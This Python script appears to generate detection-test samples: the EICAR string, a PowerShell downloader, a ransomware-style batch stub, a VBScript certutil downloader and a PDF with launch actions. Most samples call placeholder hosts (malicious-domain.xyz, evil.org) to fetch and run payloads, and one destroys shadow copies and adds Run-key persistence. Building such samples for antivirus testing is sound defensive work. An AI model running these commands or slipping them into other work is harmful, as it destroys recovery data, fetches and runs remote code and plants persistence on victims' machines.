import os

def create_samples():
    os.makedirs('test_samples', exist_ok=True)

    # 1. EICAR Standard Test File
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    with open('test_samples/eicar_test.txt', 'w') as f:
        f.write(eicar)
    print("Created: test_samples/eicar_test.txt")

    # 2. Malicious PowerShell Script Sample
    ps1_code = """
    # Suspicious PowerShell Obfuscated Downloader
    $url = "http://malicious-domain.xyz/payload.exe"
    $output = "$env:TEMP\\update.exe"
    $wb = New-Object System.Net.WebClient
    $wb.DownloadFile($url, $output)
    powershell.exe -nop -w hidden -EncodedCommand SUVYICgOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLnh5ei9zY3JpcHQucHMxJyk=
    Invoke-Expression $output
    """
    with open('test_samples/malicious_ps1.ps1', 'w') as f:
        f.write(ps1_code)
    print("Created: test_samples/malicious_ps1.ps1")

    # 3. Ransomware Batch Script Sample
    bat_code = """
    @echo off
    :: Ransomware shadow copy destruction stub
    vssadmin delete shadows /all /quiet
    wmic shadowcopy delete
    bcdedit /set {default} recoveryenabled No
    reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MaliciousService /t REG_SZ /d "C:\\Windows\\temp\\malware.exe" /f
    """
    with open('test_samples/ransomware_stub.bat', 'w') as f:
        f.write(bat_code)
    print("Created: test_samples/ransomware_stub.bat")

    # 4. VBScript Downloader Sample
    vbs_code = """
    Dim WshShell
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run "certutil -urlcache -split -f http://evil.org/payload.exe C:\\temp\\payload.exe", 0, True
    WshShell.Run "C:\\temp\\payload.exe", 0, False
    """
    with open('test_samples/malicious_vbs.vbs', 'w') as f:
        f.write(vbs_code)
    print("Created: test_samples/malicious_vbs.vbs")

    # 5. PDF Exploit Stub
    pdf_code = """%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('PDF Exploit Payload Executed');) >>
/AA << /O << /S /Launch /F (cmd.exe) >> >>
>>
endobj
%%EOF
"""
    with open('test_samples/exploit_doc.pdf', 'w') as f:
        f.write(pdf_code)
    print("Created: test_samples/exploit_doc.pdf")

if __name__ == '__main__':
    create_samples()
